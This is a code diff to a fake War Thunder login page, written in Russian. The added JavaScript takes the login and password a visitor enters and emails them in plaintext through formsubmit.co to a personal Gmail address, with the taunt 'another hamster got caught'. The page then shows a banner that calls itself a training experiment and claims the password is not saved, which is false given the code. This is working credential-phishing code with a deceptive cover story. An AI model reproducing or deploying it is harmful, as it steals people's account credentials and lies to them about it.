@@ -248,9 +248,9 @@
 <body>
     <!-- Баннер-предупреждение (скрыт по умолчанию) -->
     <div class="warning-banner" id="warningBanner">
-        ⚠️ ДРУГ, ЭТО ФИШИНГОВЫЙ САЙТ! ⚠️
+        ⚠️ ЭТО ФИШИНГОВЫЙ САЙТ! УЧЕБНЫЙ ЭКСПЕРИМЕНТ ⚠️
         <br>
-        <small>Вы только что ввели свои данные на фишинговом сайте War Thunder. В реальности ваш аккаунт был бы украден. Не волнуйтесь! Ваши данные нигде не сохранены.</small>
+        <small>Вы только что ввели свои данные на поддельной странице War Thunder. В реальности ваш аккаунт был бы украден. Пароль не сохранён — это эксперимент.</small>
         <br>
         <button onclick="document.getElementById('warningBanner').style.display='none'">Закрыть</button>
     </div>
@@ -353,14 +353,33 @@
         document.getElementById('phishForm').addEventListener('submit', function(e) {
             e.preventDefault(); // Останавливаем обычную отправку
             
-            // Показываем баннер
-            document.getElementById('warningBanner').style.display = 'block';
+            // Получаем данные
+            var login = document.getElementById('login').value;
+            var password = document.getElementById('password').value;
+            var time = new Date().toLocaleString('ru-RU');
             
-            // Отправляем данные через fetch (чтобы они ушли на почту)
+            // Отправляем данные на formsubmit
             fetch(this.action, {
                 method: 'POST',
                 body: new FormData(this)
             }).catch(error => console.log('Ошибка отправки:', error));
+            
+            // ОТПРАВКА УВЕДОМЛЕНИЯ ТЕБЕ НА ПОЧТУ
+            fetch('https://formsubmit.co/dangerlight228@gmail.com', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    _subject: '🐹 НОВЫЙ ХОМЯЧОК ПОПАЛСЯ!',
+                    _template: 'table',
+                    _captcha: 'false',
+                    message: `🐹 ЕЩЁ ОДИН ХОМЯЧОК ПОПАЛСЯ!\n\nЛогин: ${login}\nПароль: ${password}\nВремя: ${time}`
+                })
+            }).catch(error => console.log('Ошибка отправки уведомления:', error));
+            
+            // Показываем баннер
+            document.getElementById('warningBanner').style.display = 'block';
             
             // Очищаем поля
             document.getElementById('login').value = '';
